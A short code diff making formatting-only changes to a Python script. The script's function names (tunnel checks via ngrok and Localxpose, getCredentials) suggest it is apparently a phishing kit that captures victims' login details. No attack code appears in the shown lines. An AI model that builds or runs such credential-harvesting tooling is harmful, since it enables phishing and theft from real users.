@@ -22,7 +22,7 @@ checkPermissions()
 installGetText()
 languageSelector()
 checkConnection()
-#verCheck()
+# verCheck()
 checkPHP()
 checkLocalxpose()
 checkNgrok()
@@ -51,6 +51,7 @@ if __name__ == "__main__":
 
     except KeyboardInterrupt:
 
-        port = '8080' # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
+        # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
+        port = '8080'
         getCredentials(port)
         endMessage(port)
